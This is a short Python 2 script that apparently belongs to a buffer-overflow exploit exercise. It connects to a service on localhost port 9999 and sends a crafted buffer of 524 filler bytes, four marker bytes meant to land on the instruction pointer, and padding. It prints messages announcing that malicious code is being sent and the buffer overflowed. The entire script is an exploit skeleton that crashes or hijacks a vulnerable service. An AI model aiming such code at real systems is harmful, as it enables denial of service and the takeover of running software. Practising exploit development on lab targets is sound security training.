#!/usr/bin/python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


buffer = 'A'*524 + 'B'*4 + 'C'*(1400-524-4)

try:
    print "\n Sending Malicious Code to Buffer..."
    s.connect(('127.0.0.1', 9999))
    data = s.recv(1024)
    s.send(buffer + '\r\n')
    print "\nBuffer Overflowed!!!!!"

except:
    print "Could not connect to application"
